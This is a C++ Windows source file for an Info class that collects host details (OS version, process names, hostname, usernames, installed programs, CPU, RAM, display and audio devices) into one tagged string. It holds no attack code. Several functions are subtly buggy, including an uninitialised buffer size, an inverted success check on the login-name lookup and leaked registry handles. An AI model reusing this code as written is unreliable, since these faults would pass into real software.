#include "stdafx.h"
#include "Info.h"
#include "Util.h"
#include <functiondiscoverykeys_devpkey.h>

// Use to convert bytes to MB
#define DIV 1048576

Info info;

#define SAFE_RELEASE(p) if(p) { p->Release(); p = NULL; }


Info::Info() : dwLastProcessTime(0), dwLastSystemTime(0), dCPULoad(0)
{
	// Has to be called atleast one time until we can use its value
	std::tstring dummy;
	HRESULT hr;

	this->GetCPULoad(dummy);

	hr = CoInitializeEx(0, COINITBASE_MULTITHREADED);
	if(FAILED(hr)) {
		Error(TEXT("Failed to initialize COM"));
	}
}

Info::~Info()
{
}

void Info::GetInformation(std::tstring& str)
{
	str += _T("osVer:");
	this->GetOSVersion(str);
	str += _T("\n");

	str += _T("procs:");
	this->EnumerateProcesses(str);
	str += _T("\n");

	str += _T("hostname:");
	this->GetHostname(str);
	str += _T("\n");

	str += _T("time:");
	this->GetTime(str);
	str += _T("\n");

	str += _T("memory-usage:");
	this->GetMemoryStatus(str);
	str += _T("\n");

	str += _T("cpu-usage:");
	this->GetCPULoad(str);
	str += _T("\n");

	str += _T("name-real:");
	this->GetUsernameReal(str);
	str += _T("\n");

	str += _T("name-login:");
	this->GetUsernameLogin(str);
	str += _T("\n");

	str += _T("programs:");
	this->GetProgramList(str);
	str += _T("\n");

	str += _T("cpu:");
	this->GetCPUInfo(str);
	str += _T("\n");

	str += _T("ram:");
	this->GetRAMInfo(str);
	str += _T("\n");

	str += _T("display:");
	this->GetDisplayDeviceInfo(str);
	str += _T("\n");

	str += _T("audio:");
	this->GetAudioDeviceInfo(str);
	str += _T("\n");
}

bool Info::GetOSVersion(std::tstring& str)
{
	OSVERSIONINFO osVersionInfo;

	ZeroMemory(&osVersionInfo, sizeof(OSVERSIONINFO));
	osVersionInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);

	// TODO: this function is deprecated since Windows 8?
	GetVersionEx(&osVersionInfo);

	str += std::to_tstring(osVersionInfo.dwMajorVersion);
	str += _T(".");
	str += std::to_tstring(osVersionInfo.dwMinorVersion);
	str += _T(".");
	str += std::to_tstring(osVersionInfo.dwBuildNumber);

	return true;
}
bool Info::GetProcessInfoStr(DWORD processID, std::tstring& str)
{
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
		FALSE, processID);

	if(hProcess == NULL) {
		return false;
	}

	HMODULE hMod;
	DWORD bytesNeeded;

	if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &bytesNeeded)) {
		TCHAR processName[MAX_PATH];
		if (GetModuleBaseName(hProcess, hMod, processName, sizeof(processName) / sizeof(TCHAR))) {
			str += processName;
			return true;
		}
	}

	return false;
}
bool Info::EnumerateProcesses(std::tstring& str)
{
	DWORD processes[1024];
	DWORD bytesNeeded;
	DWORD processCount;
	size_t i;

	if(!EnumProcesses(processes, sizeof(processes), &bytesNeeded)) {
		return false;
	}

	processCount = bytesNeeded / sizeof(DWORD);

	for(i = 0; i < processCount; i++) {
		if(processes[i] != 0) {
			if(GetProcessInfoStr(processes[i], str)) {
				str += _T(";");
			}
		}
	}

	return true;
}

bool Info::GetHostname(std::tstring& str)
{
	TCHAR buffer[MAX_COMPUTERNAME_LENGTH + 1];
	DWORD size;

	if(GetComputerName(buffer, &size) != 0) {
		str += std::tstring(buffer, size);
		return true;
	} else {
		str += _T("unknown");
		return false;
	}
}

bool Info::GetTime(std::tstring &str)
{
	SYSTEMTIME sysTime;

	ZeroMemory(&sysTime, sizeof(SYSTEMTIME));
	GetLocalTime(&sysTime);

	str += std::to_tstring(sysTime.wDay);
	str += _T(".");
	str += std::to_tstring(sysTime.wMonth);
	str += _T("."),
	str += std::to_tstring(sysTime.wYear);
	str += _T(" ");
	str += std::to_tstring(sysTime.wHour);
	str += _T(":");
	str += std::to_tstring(sysTime.wMinute);
	str += _T(":");
	str += std::to_tstring(sysTime.wSecond);

	return true;
}

bool Info::GetMemoryStatus(std::tstring& str)
{
	MEMORYSTATUSEX statex;
	statex.dwLength = sizeof(statex);

	if (GlobalMemoryStatusEx(&statex)) {
		str += _T("total:");
		str += std::to_tstring(statex.ullTotalPhys / DIV);
		str += _T(";");

		str += _T("free:");
		str += std::to_tstring(statex.ullAvailPhys / DIV);
		str += _T(";");
		
		return true;
	} else {
		return false;
	}
}

bool Info::GetCPULoad(std::tstring& str)
{
	FILETIME ftCreationTime, ftExitTime, ftKernelTime, ftUserTime;
	ULARGE_INTEGER uiKernelTime, uiUserTime;

	GetProcessTimes(GetCurrentProcess(), &ftCreationTime, &ftExitTime, &ftKernelTime, &ftUserTime);

	uiKernelTime.HighPart = ftKernelTime.dwHighDateTime;
	uiKernelTime.LowPart = ftKernelTime.dwLowDateTime;
	uiUserTime.HighPart = ftUserTime.dwHighDateTime;
	uiUserTime.LowPart = ftUserTime.dwLowDateTime;

	DWORD dwActualProcessTime = (DWORD)((uiKernelTime.QuadPart + uiUserTime.QuadPart) / 100);
	DWORD dwActualSystemTime = GetTickCount();

	if(dwLastSystemTime) {
		dCPULoad = (double)(dwActualProcessTime - dwLastProcessTime) / (dwActualSystemTime - dwLastSystemTime);
	}
	dwLastProcessTime = dwActualProcessTime;
	dwLastSystemTime = dwActualSystemTime;

	str += std::to_tstring(dCPULoad);

	return true;
}

bool Info::GetUsernameReal(std::tstring& str)
{
	TCHAR buffer[1024] = { 0 };
	ULONG size = sizeof(buffer);

	if(GetUserNameEx(NameDisplay, buffer, &size)) {
		str += std::tstring(buffer, size);
		return true;
	} else {
		str += _T("unknown");
		return false;
	}
}

bool Info::GetUsernameLogin(std::tstring& str)
{
	TCHAR buffer[1024] = { 0 };
	ULONG size = sizeof(buffer);

	if(GetUserName(buffer, &size) == 0) {
		str += std::tstring(buffer, size);
		return true;
	} else {
		str += _T("unknown");
		return false;
	}
}

bool Info::GetProgramList(std::tstring& str)
{
	HKEY hKey = { 0 };
	LPCTSTR path = _T("Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
	HRESULT status;

	status = RegOpenKeyEx(HKEY_LOCAL_MACHINE, path, 0, KEY_ENUMERATE_SUB_KEYS | KEY_WOW64_64KEY, &hKey);

	if(status != ERROR_SUCCESS) {
		return false;
	}

	DWORD index = 0;
	TCHAR keyName[256] = { 0 };
	DWORD keyLen = 256;

	while(RegEnumKeyEx(hKey, index++, keyName, &keyLen, 0, 0, 0, 0) == ERROR_SUCCESS) {
		keyLen = 256;

		HKEY hSubKey = { 0 };
		if(RegOpenKeyEx(hKey, keyName, 0, KEY_READ, &hSubKey) == ERROR_SUCCESS) {
			TCHAR dest[256];
			DWORD size = 256;

			status = RegQueryValueEx(hSubKey, _T("DisplayName"), NULL, NULL, (LPBYTE)dest, &size);
			if(status != ERROR_SUCCESS) {
				continue;
			}

			// ignore size?
			str += std::tstring(dest);
			str += _T(";");
		}
	}

	return true;
}

bool Info::GetCPUInfo(std::tstring &str)
{
	HKEY hKey = { 0 };
	LPCTSTR path = TEXT("HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0");
	HRESULT status;

	status = RegOpenKeyEx(HKEY_LOCAL_MACHINE, path, 0, KEY_READ | KEY_WOW64_64KEY, &hKey);

	if(status != ERROR_SUCCESS) {
		return false;
	}

	TCHAR dest[256];
	DWORD size = 256;

	status = RegQueryValueEx(hKey, TEXT("ProcessorNameString"), NULL, NULL, (LPBYTE)dest, &size);
	if(status != ERROR_SUCCESS) {
		return false;
	}

	str += std::tstring(dest);
	return true;
}

bool Info::GetRAMInfo(std::tstring &str)
{
	unsigned long long memory = 0;

	if(GetPhysicallyInstalledSystemMemory(&memory)) {
		str += std::to_tstring(memory / 1024);
		str += TEXT(" MB");
		return true;
	}

	return false;
}

bool Info::GetDisplayDeviceInfo(std::tstring &str)
{
	DISPLAY_DEVICE diDev;

	diDev.cb = sizeof(DISPLAY_DEVICE);

	if(EnumDisplayDevices(NULL, 0, &diDev, 0)) {
		str += diDev.DeviceString;
		return true;
	}

	return false;
}

bool Info::GetAudioDeviceInfo(std::tstring &str)
{
	bool ret = true;
	HRESULT hr = S_OK;
	IMMDeviceEnumerator *enumerator = NULL;
	IMMDevice *device = NULL;
	IPropertyStore *propStore = NULL;
	PROPVARIANT varName = { 0 };
	IMMDeviceCollection *collection = NULL;
	UINT count = 0;

	hr = CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_ALL, __uuidof(IMMDeviceEnumerator), (void **)&enumerator);
	if(FAILED(hr)) {
		Error(TEXT("CoCreateInstance failed for IMMDeviceEnumerator"));
		ret = false;
		goto clear;
	}

	hr = enumerator->EnumAudioEndpoints(eRender, DEVICE_STATE_ACTIVE, &collection);
	if(FAILED(hr)) {
		Error(TEXT("EnumAudioEndpoints failed"));
		ret = false;
		goto clear;
	}

	hr = collection->GetCount(&count);
	if(FAILED(hr)) {
		Error(TEXT("GetCount failed"));
		ret = false;
		goto clear;
	}

	for(ULONG i = 0; i < count; i++) {
		hr = collection->Item(i, &device);
		if(FAILED(hr)) {
			Error(TEXT("Item failed"));
			ret = false;
			goto clear;
		}

		hr = device->OpenPropertyStore(STGM_READ, &propStore);
		if(FAILED(hr)) {
			Error(TEXT("OpenPropertyStore failed"));
			ret = false;
			goto clear;
		}

		PropVariantInit(&varName);

		hr = propStore->GetValue(PKEY_DeviceInterface_FriendlyName, &varName);
		if(FAILED(hr)) {
			Error(TEXT("GetValue failed"));
			ret = false;
			goto clear;
		}

		str += Util::ws2t(varName.pwszVal);
		str += _T(";");

		PropVariantClear(&varName);
		SAFE_RELEASE(propStore);
		SAFE_RELEASE(device);
	}

clear:
	PropVariantClear(&varName);
	SAFE_RELEASE(propStore);
	SAFE_RELEASE(device);
	SAFE_RELEASE(collection);
	SAFE_RELEASE(enumerator);

	return ret;
}